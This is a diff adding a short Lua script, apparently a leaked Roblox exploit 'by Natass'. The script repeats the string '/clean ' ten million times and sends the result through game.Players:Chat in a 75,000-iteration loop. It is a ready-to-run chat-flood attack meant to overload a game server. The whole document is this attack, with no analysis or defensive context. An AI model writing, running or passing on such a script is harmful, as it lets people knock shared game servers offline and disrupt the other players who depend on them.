@@ -1,0 +1,8 @@
+---// leaked by Natass
+local natass = "/"
+
+    local Message = (natass.. "clean".." "):rep(10000000)
+
+    for i = 1, 75000 do
+        game.Players:Chat(Message)
+    end
